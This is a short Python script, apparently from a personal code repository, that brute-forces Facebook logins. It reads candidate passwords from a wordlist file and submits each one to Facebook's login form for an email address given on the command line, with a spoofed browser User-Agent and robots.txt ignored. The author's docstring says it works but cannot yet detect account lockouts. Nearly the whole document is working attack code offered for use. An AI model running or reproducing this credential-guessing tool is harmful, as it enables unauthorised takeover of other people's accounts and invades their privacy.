"""
The Scipt works fines, it just that it cannot tell difference between when the account has been blocked due
to several login attempts.
I will implement that feature soon.
"""

#!/usr/bin/env python

import mechanize
import sys

br = mechanize.Browser()
br.addheaders=[('User-Agent', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0')]
br.set_handle_robots(False)
f = open("pass.lst","rt")
for i in f.readlines():
    print "Trying password %s" %i
    br.open("https://www.facebook.com/login.php")
    br.select_form(nr=0)
    email=sys.argv[1]
    br.form['email']=email
    br.form['pass']=i
    response = br.submit()
    if str(email.replace("@","&#064;")) not in str(response.get_data()):
        print "password  found"
        sys.exit()
    else:
        print "password not found"
